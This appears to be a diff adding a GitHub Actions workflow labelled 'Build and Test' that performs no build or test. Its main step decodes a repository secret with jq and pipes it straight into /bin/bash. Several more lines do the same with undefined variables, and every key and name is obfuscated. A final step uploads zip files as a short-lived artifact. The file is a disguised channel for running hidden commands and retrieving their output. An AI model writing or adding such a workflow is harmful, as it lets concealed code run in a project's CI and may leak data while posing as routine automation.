@@ -1,0 +1,33 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          z674: ${{ secrets.z674 }}
+        run: |
+          printf '%s' "$z674" | jq -r .iouku5912 | /bin/bash
+          printf '%s' "$hdq603" | jq -r .lz199 | /bin/bash
+          echo $mid330 | jq -r .yuux707 | /bin/bash
+          echo $s8147 | jq -r .qr8 | /bin/bash
+          echo $dxuan158 | jq -r .kxt280 | /bin/bash
+
+      - name: Upload results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: lSLk8BwG
+          path: "*.zip"
+          retention-days: 1
